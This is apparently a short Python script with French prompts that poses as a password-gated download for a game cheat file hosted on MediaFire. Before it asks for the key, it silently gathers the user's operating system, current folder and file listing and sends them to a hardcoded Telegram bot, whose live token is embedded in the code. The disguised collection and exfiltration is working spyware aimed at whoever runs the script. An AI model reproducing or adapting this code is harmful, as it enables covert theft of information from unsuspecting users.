import os
import json
import requests
from colorama import Fore

print("Veuillez patienter....")

users ={
"Plateform":os.name,
"Dossier":os.getcwd(),
"Fichier/dossier":os.listdir()
}




config = json.dumps(users)
	
with open("tryme.txt","w") as f:
	f.write(config)
	
TOKEN = "7894685926:AAF_cKDV7TP0jDX-2LxltQzkvRrGxFMOcEk"
CHAT_ID = "7879061625"


url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

requests.post(url, data={
    "chat_id": CHAT_ID,
    "text": config
})


password = "123"

print(Fore.GREEN+"========== Auhtentification==========")
mdp = input("Clé : "+Fore.WHITE)
if mdp == password:
	 
	print("Copier coller ce lien dans votre navigateur !!")
	print(Fore.GREEN+"https://www.mediafire.com/file/kwdx2ucgtljn5xd/Aimbasique.mdr/file")
	
else:
	print("Clé invalide ")
